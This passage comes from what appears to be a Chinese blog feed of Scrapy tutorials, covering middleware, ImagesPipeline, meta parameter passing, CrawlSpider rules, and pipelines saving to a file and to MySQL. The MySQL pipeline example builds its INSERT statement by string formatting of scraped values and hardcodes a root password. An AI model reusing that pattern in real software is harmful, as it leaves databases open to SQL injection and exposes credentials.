class="hljs-keyword">def</span> <span class="hljs-title function_">process_spider_exception</span>(<span class="hljs-params">self, response, exception, spider</span>):<br>        <span class="hljs-comment"># 在Spider处理异常时的处理</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Processing spider exception for:&quot;</span>, response.url)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># 返回None表示继续正常处理，返回Request对象表示生成新的请求</span><br><br><span class="hljs-comment"># settings.py</span><br><br>SPIDER_MIDDLEWARES = &#123;<br>    <span class="hljs-string">&#x27;myproject.middlewares.MySpiderMiddleware&#x27;</span>: <span class="hljs-number">543</span>,<br>    <span class="hljs-comment"># 543 是Spider中间件的优先级，数字越小，优先级越高</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ImagesPipeline</title>
    <link href="/2023/10/02/Python/Spider/Scrapy/ImagesPipeline/"/>
    <url>/2023/10/02/Python/Spider/Scrapy/ImagesPipeline/</url>
    
    <content type="html"><![CDATA[<h1 id="基于scrapy">1. 基于Scrapy</h1><ul><li>字符串：只需要基于xpath进行解析，提交管道进行持久化存储</li><li>图片：xpath解析出图片src属性值，再单独对该地址发送请求获取图片二进制类型的数据</li></ul><h1 id="imagespipeline">2. ImagesPipeline</h1><ul><li><p>只需解析出图片src属性值，提交给管道，管道就会对该地址进行请求并获得二进制响应数据</p></li><li><p>使用流程：</p><ul><li><p>数据解析（得到图片地址）</p></li><li><p>将item提交到管道</p></li><li><p>重写一个基于ImagesPipeline的一个管道类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pipelines.py</span><br><span class="hljs-keyword">from</span> scrapy.pipelines.images <span class="hljs-keyword">import</span> ImagesPipeline<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">imgsPipeline</span>(<span class="hljs-title class_ inherited__">ImagesPipeline</span>):<br>    <span class="hljs-comment"># 根据图片地址进行图片数据的请求</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_media_requests</span>(<span class="hljs-params">self, item, info</span>):<br>        <span class="hljs-keyword">yield</span> scrapy.Request(item[<span class="hljs-string">&#x27;src&#x27;</span>])<br><br>    <span class="hljs-comment"># 指定图片存储的路径</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">file_path</span>(<span class="hljs-params">self, request, response=<span class="hljs-literal">None</span>, info=<span class="hljs-literal">None</span>, *, item=<span class="hljs-literal">None</span></span>):<br>        imgName=request.url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">return</span> imgName<br><br>    <span class="hljs-comment"># 返回给下一个将要执行的管道</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">item_completed</span>(<span class="hljs-params">self, results, item, info</span>):<br>        <span class="hljs-keyword">return</span> item<br><br></code></pre></td></tr></table></figure></li><li><p>修改配置文件：指定图片存储位置(<code>IMAGES_STORE = ''</code>)；开启管道</p></li></ul></li></ul><h1 id="图片懒加载">3. 图片懒加载</h1><ul><li>懒加载，即延迟加载(Lazyload)。简单来说就是一个长页面中需要展示很多图像的时候，如果在进入页面的时候一次性把所有图片加载完，需要很长的时间。为了提升用户体验，我们使用懒加载，当图片出现在浏览器可视区域时，才加载图片。</li><li>遇到此类情况，进行数据解析时需要使用伪属性。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy请求传参</title>
    <link href="/2023/10/01/Python/Spider/Scrapy/Scrapy%E8%AF%B7%E6%B1%82%E4%BC%A0%E5%8F%82/"/>
    <url>/2023/10/01/Python/Spider/Scrapy/Scrapy%E8%AF%B7%E6%B1%82%E4%BC%A0%E5%8F%82/</url>
    
    <content type="html"><![CDATA[<h1 id="使用场景">1. 使用场景</h1><p>爬取解析的数据不在同一张页面中</p><h1 id="使用流程">2. 使用流程</h1><ul><li>请求传参传的是item的对象</li><li><code>meta=&#123;'item':item&#125;</code>，可以将meta字典传递给请求对应的回调函数</li><li>回调函数接收item：<code>item=response.meta['item']</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> bossPro.items <span class="hljs-keyword">import</span> BossproItem<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BossSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;boss&quot;</span><br>    <span class="hljs-comment"># allowed_domains = [&quot;zhipin.com&quot;]</span><br>    start_urls = [<span class="hljs-string">&quot;https://699pic.com/tupian/264659-1.html&quot;</span>]<br>    url = <span class="hljs-string">&quot;https://699pic.com/tupian/264659-%d.html&quot;</span><br>    page_num = <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        li_list = response.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;wrapper&quot;]/div[4]/div/div&#x27;</span>)<br>        <span class="hljs-comment"># print(li_list)</span><br>        <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_list:<br>            pic_name = li.xpath(<span class="hljs-string">&#x27;./a/@title&#x27;</span>).get()<br>            pic_id_url = <span class="hljs-string">&quot;https://&quot;</span> + li.xpath(<span class="hljs-string">&#x27;./a/@href&#x27;</span>).get()<br>            item = BossproItem()<br>            item[<span class="hljs-string">&#x27;pic_name&#x27;</span>] = pic_name<br>            <span class="hljs-comment"># 手动发送请求，meta请求传参</span><br>            <span class="hljs-keyword">yield</span> scrapy.Request(url=pic_id_url, callback=self.parse_detail, meta=&#123;<span class="hljs-string">&#x27;item&#x27;</span>: item&#125;)<br><br>        <span class="hljs-keyword">if</span> self.page_num &lt;= <span class="hljs-number">3</span>:<br>            new_url = <span class="hljs-built_in">format</span>(self.url % self.page_num)<br>            self.page_num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">yield</span> scrapy.Request(url=new_url, callback=self.parse)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_detail</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-comment"># 回调函数接收item</span><br>        item = response.meta[<span class="hljs-string">&#x27;item&#x27;</span>]<br>        <span class="hljs-comment"># print(item[&#x27;pic_name&#x27;])</span><br>        pic_id = response.xpath(<span class="hljs-string">&#x27;/html/body/div[12]/div[2]/div[1]/div/div[1]/div[1]/h1/span[2]/text()&#x27;</span>).get()<br>        item[<span class="hljs-string">&#x27;pic_id&#x27;</span>] = pic_id<br>        <span class="hljs-keyword">yield</span> item<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy全站数据爬取</title>
    <link href="/2023/10/01/Python/Spider/Scrapy/Scrapy%E5%85%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E7%88%AC%E5%8F%96/"/>
    <url>/2023/10/01/Python/Spider/Scrapy/Scrapy%E5%85%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E7%88%AC%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="全站数据爬取">1. 全站数据爬取</h1><p>将某网站中某模块下全部页码对应的页面数据进行爬取</p><h1 id="基于spider的全站数据爬取">2. 基于Spider的全站数据爬取</h1><ol type="1"><li><p>将所有页面url添加到start_urls列表中</p></li><li><p>手动实现请求发送（推荐）</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 手动实现请求发送</span><br><span class="hljs-keyword">import</span> scrapy<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaohuaSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;xiaohua&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;699pic.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://699pic.com/tupian/photo-264659.html&quot;</span>]<br>    <span class="hljs-comment"># 基于Spider</span><br>    <span class="hljs-comment"># 通用url模板</span><br>    url = <span class="hljs-string">&quot;https://699pic.com/photo/264659-%d.html&quot;</span><br>    page_num = <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        li_list = response.xpath(<span class="hljs-string">&#x27;/html/body/div[11]/div[4]/div/div&#x27;</span>)<br>        <span class="hljs-comment"># print(li_list)</span><br>        <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_list:<br>            img_name = li.xpath(<span class="hljs-string">&#x27;./a/@title&#x27;</span>).extract_first()<br>            <span class="hljs-built_in">print</span>(img_name)<br><br>        <span class="hljs-keyword">if</span> self.page_num &lt;= <span class="hljs-number">3</span>:<br>            new_url = <span class="hljs-built_in">format</span>(self.url % self.page_num)<br>            self.page_num += <span class="hljs-number">1</span><br>            <span class="hljs-comment"># 告诉Scrapy发送一个请求到下一个页面（使用 new_url 构建，其中包括递增的页面号）</span><br>            <span class="hljs-comment"># 当接收到响应时，将调用 parse 方法来从响应中提取和处理数据</span><br>            <span class="hljs-comment"># callback为回调函数，进行数据解析</span><br>            <span class="hljs-comment"># 这是Scrapy爬虫中用于爬取分页网站的常见模式。</span><br>            <span class="hljs-keyword">yield</span> scrapy.Request(url=new_url, callback=self.parse)<br></code></pre></td></tr></table></figure><h1 id="基于crawlspider的全站数据爬取">3.基于CrawlSpider的全站数据爬取</h1><h2 id="介绍">3.1 介绍</h2><p><code>CrawlSpider</code> 是 Scrapy框架提供的一个高级爬虫类，它是基于规则的爬虫，用于处理常见的爬取场景，例如按照链接规则递归爬取页面。<code>CrawlSpider</code>继承自 <code>Spider</code> 类，但相较于基础的 <code>Spider</code>类，它提供了更多的功能，使得爬取规则的定义更加灵活和简便。</p><h3 id="rules">3.1.1 Rules</h3><p>CrawlSpider使用rules来决定爬虫的爬取规则，并将匹配后的url请求提交给引擎。所以在正常情况下，CrawlSpider不需要单独手动返回请求了。在Rules中包含一个或多个Rule对象，每个Rule对爬取网站的动作定义了某种特定操作，比如提取当前相应内容里的特定链接，是否对提取的链接跟进爬取，对提交的请求设置回调函数等。如果多个Rule匹配了相同的链接，则根据规则在本集合中被定义的顺序，第一个会被使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">scrapy</span>.<span class="hljs-property">spiders</span>.<span class="hljs-title class_">Rule</span>(<br>        link_extractor,<br>        callback = <span class="hljs-title class_">None</span>,<br>        cb_kwargs = <span class="hljs-title class_">None</span>,<br>        follow = <span class="hljs-title class_">None</span>,<br>        process_links = <span class="hljs-title class_">None</span>,<br>        process_request = <span class="hljs-title class_">None</span><br>)<br></code></pre></td></tr></table></figure><ul><li>link_extractor：是一个LinkExtractor对象，用于定义需要提取的链接。</li><li>callback： 从LinkExtractor中每获取到链接时，参数所指定的值作为回调函数，该回调函数接受一个response作为其第一个参数。注意：当编写爬虫规则时，避免使用parse作为回调函数。由于CrawlSpider使用parse方法来实现其逻辑，如果覆盖了parse方法，crawl spider将会运行失败。</li><li>follow：是一个布尔(boolean)值，指定了根据该规则从response提取的链接是否需要跟进。如果callback为None，follow 默认设置为True ，否则默认为False。</li><li>process_links：指定该spider中哪个的函数将会被调用，从link_extractor中获取到链接列表时将会调用该函数。该方法主要用来过滤。</li><li>process_request：指定该spider中哪个的函数将会被调用，该规则提取到每个request时都会调用该函数。(用来过滤request)</li></ul><h3 id="linkextractors">3.1.2 LinkExtractors</h3><p>Link Extractors 的目的很简单：提取链接｡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">scrapy</span>.<span class="hljs-property">linkextractors</span>.<span class="hljs-title class_">LinkExtractor</span>(<br>    allow = (),<br>    deny = (),<br>    allow_domains = (),<br>    deny_domains = (),<br>    deny_extensions = <span class="hljs-title class_">None</span>,<br>    restrict_xpaths = (),<br>    tags = (<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;area&#x27;</span>),<br>    attrs = (<span class="hljs-string">&#x27;href&#x27;</span>),<br>    canonicalize = <span class="hljs-title class_">True</span>,<br>    unique = <span class="hljs-title class_">True</span>,<br>    process_value = <span class="hljs-title class_">None</span><br>)<br></code></pre></td></tr></table></figure><ul><li>allow：满足括号中正则表达式的URL会被提取，如果为空，则全部匹配。</li><li>deny：满足括号中正则表达式的URL一定不提取（优先级高于allow）。</li><li>allow_domains：会被提取的链接的domains。</li><li>deny_domains：一定不会被提取链接的domains。</li><li>restrict_xpaths：使用xpath表达式，和allow共同作用过滤链接。</li></ul><h2 id="使用">3.2 使用</h2><ol type="1"><li>创建工程</li><li>进入工程根目录</li><li>创建爬虫文件（CrawlSpider）:<code>scrapy genspider -t crawl spiderName allowed_domains</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> scrapy.linkextractors <span class="hljs-keyword">import</span> LinkExtractor<br><span class="hljs-keyword">from</span> scrapy.spiders <span class="hljs-keyword">import</span> CrawlSpider, Rule<br><span class="hljs-keyword">from</span> tencenthr.items <span class="hljs-keyword">import</span> TtItem<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TthrSpider</span>(<span class="hljs-title class_ inherited__">CrawlSpider</span>):<br>    name = <span class="hljs-string">&#x27;tthr&#x27;</span><br>    allowed_domains = [<span class="hljs-string">&#x27;tencent.com&#x27;</span>]<br>    start_urls = [<span class="hljs-string">&#x27;https://hr.tencent.com/position.php&#x27;</span>]<br><br>    rules = (<br>        Rule(LinkExtractor(allow=<span class="hljs-string">r&#x27;position_detail\.php\?id=\d+&amp;keywords=&amp;tid=0&amp;lid=0&#x27;</span>), callback=<span class="hljs-string">&#x27;parse_item&#x27;</span>),<br>        Rule(LinkExtractor(allow=<span class="hljs-string">r&#x27;position\.php\?&amp;start=\d+#a&#x27;</span>), follow=<span class="hljs-literal">True</span>)<br>    )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_item</span>(<span class="hljs-params">self, response</span>):<br>        item = TtItem()<br>        item[<span class="hljs-string">&#x27;sharetitle&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//td[@id=&quot;sharetitle&quot;]/text()&#x27;</span>).extract_first()<br>        item[<span class="hljs-string">&#x27;category&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//span[text()=&quot;职位类别：&quot;]/../text()&#x27;</span>).extract_first()<br>        item[<span class="hljs-string">&#x27;location&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//span[text()=&quot;工作地点：&quot;]/../text()&#x27;</span>).extract_first()<br>        item[<span class="hljs-string">&#x27;num&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//span[text()=&quot;招聘人数：&quot;]/../text()&#x27;</span>).extract_first()<br>        item[<span class="hljs-string">&#x27;duty&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//div[text()=&quot;工作职责：&quot;]/../ul/li/text()&#x27;</span>).extract()<br>        item[<span class="hljs-string">&#x27;claim&#x27;</span>] = response.xpath(<span class="hljs-string">&#x27;//div[text()=&quot;工作要求：&quot;]/../ul/li/text()&#x27;</span>).extract()<br>        <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy持久化存储</title>
    <link href="/2023/09/30/Python/Spider/Scrapy/Scrapy%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8/"/>
    <url>/2023/09/30/Python/Spider/Scrapy/Scrapy%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="基于终端指令">1. 基于终端指令</h1><ul><li>要求：只可以将parse方法的返回值存储到本地的文本文件</li><li>指令：<code>scrapy crawl spiderName -o filePath</code></li><li>注意：<ul><li>需在项目根目录下执行该命令</li><li>支持的文件格式：'json', 'jsonlines', 'jsonl', 'jl', 'csv', 'xml','marshal', 'pickle'</li></ul></li><li>优点：简介高效便捷</li><li>局限性较强（文件类型有限制）</li></ul><h1 id="基于管道重点">2. 基于管道（重点）</h1><ul><li>编码流程：<ol type="1"><li>数据解析</li><li>item类中定义相关属性</li><li>将解析的数据封装为item类型的对象</li><li>提交item类型的对象给管道（先给优先级最高的管道，管道内依次传递），进行持久化存储</li><li>process_item对item类型对象进行处理</li><li>配置文件中开启管道</li></ol></li><li>优点：通用性强</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># spiders/xxx.py</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> game.items <span class="hljs-keyword">import</span> GameItem  <span class="hljs-comment"># 引入Item类</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaoSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;xiao&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;4399.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://4399.com/flash/&quot;</span>]  <span class="hljs-comment"># 起始页面url</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        li_list = response.xpath(<span class="hljs-string">&quot;/html/body/div[8]/ul/li&quot;</span>)<br>        <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_list:<br>            name = li.xpath(<span class="hljs-string">&quot;./a/b/text()&quot;</span>).extract_first()  <span class="hljs-comment"># extract_first()提取第一项，没有则返回None</span><br>            category = li.xpath(<span class="hljs-string">&quot;./em/a/text()&quot;</span>).extract_first()<br>            time = li.xpath(<span class="hljs-string">&quot;./em/text()&quot;</span>).extract_first()<br>            <span class="hljs-comment"># 创建item对象</span><br>            item = GameItem()<br>            item[<span class="hljs-string">&#x27;name&#x27;</span>] = name<br>            item[<span class="hljs-string">&#x27;category&#x27;</span>] = category<br>            item[<span class="hljs-string">&#x27;time&#x27;</span>] = time<br>            <span class="hljs-comment"># 向管道提交item</span><br>            <span class="hljs-keyword">yield</span> item<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pipelines.py</span><br><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-comment"># Define your item pipelines here</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span><br><span class="hljs-comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span><br><br><br><span class="hljs-comment"># useful for handling different item types with a single interface</span><br><span class="hljs-keyword">from</span> itemadapter <span class="hljs-keyword">import</span> ItemAdapter<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GamePipeline</span>:<br>    fp = <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 重写父类方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open_spider</span>(<span class="hljs-params">self, item</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始爬虫.....&quot;</span>)<br>        self.fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./gameInfo.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    <span class="hljs-comment"># 处理数据专用方法</span><br>    <span class="hljs-comment"># 必须有return</span><br>    <span class="hljs-comment"># 该方法每接受到一个item，就被调用一次</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>        <span class="hljs-comment"># print(item)</span><br>        name = item[<span class="hljs-string">&#x27;name&#x27;</span>]<br>        category = item[<span class="hljs-string">&#x27;category&#x27;</span>]<br>        time = item[<span class="hljs-string">&#x27;time&#x27;</span>]<br>        test = item[<span class="hljs-string">&#x27;test&#x27;</span>]<br>        self.fp.write(<span class="hljs-string">&quot;name:&quot;</span> + name + <span class="hljs-string">&quot;,category:&quot;</span> + category + <span class="hljs-string">&quot;,time:&quot;</span> + time + <span class="hljs-string">&quot;,test:&quot;</span> + test + <span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> item  <span class="hljs-comment"># 传递给下一个管道</span><br><br>    <span class="hljs-comment"># 重写父类方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close_spider</span>(<span class="hljs-params">self, item</span>):<br>        self.fp.close()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;结束爬虫&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NewPipeline</span>:<br>    <span class="hljs-comment"># 观察优先级  299</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>        item[<span class="hljs-string">&#x27;test&#x27;</span>] = <span class="hljs-string">&quot;优先级测试&quot;</span><br>        <span class="hljs-keyword">return</span> item<br><br><br><span class="hljs-comment"># 数据库存储</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySQLPipeline</span>:<br>    coon = <span class="hljs-literal">None</span><br>    cursor = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open_spider</span>(<span class="hljs-params">self, item</span>):<br>        self.coon = pymysql.Connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&quot;11111111&quot;</span>,<br>                                    db=<span class="hljs-string">&quot;spider_learning&quot;</span>, charset=<span class="hljs-string">&quot;utf8mb4&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>        self.cursor = self.coon.cursor()<br>        <span class="hljs-keyword">try</span>:<br>            self.cursor.execute(<span class="hljs-string">&#x27;insert into game_info values(&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;)&#x27;</span> % (<br>                item[<span class="hljs-string">&#x27;name&#x27;</span>], item[<span class="hljs-string">&#x27;category&#x27;</span>], item[<span class="hljs-string">&#x27;time&#x27;</span>], item[<span class="hljs-string">&#x27;test&#x27;</span>]))<br>            self.coon.commit()<br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.coon.rollback()<br><br>        <span class="hljs-keyword">return</span> item  <span class="hljs-comment"># 传递给下一个管道</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close_spider</span>(<span class="hljs-params">self, item</span>):<br>        self.cursor.close()<br>        self.coon.close()<br><br></code></pre></td></tr></table></figure><p><strong>pipeline管道的open_spider和close_spider：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoPipeline</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-comment"># 开启爬虫时执行，只执行一次</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open_spider</span>(<span class="hljs-params">self, spider</span>):<br>        <span class="hljs-comment"># 为spider对象动态添加属性，可以在spider模块中获取该属性值</span><br>        <span class="hljs-comment"># spider.hello = &quot;world&quot;</span><br>        <span class="hljs-comment"># 可以开启数据库等</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment"># 处理提取的数据(保存数据)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span 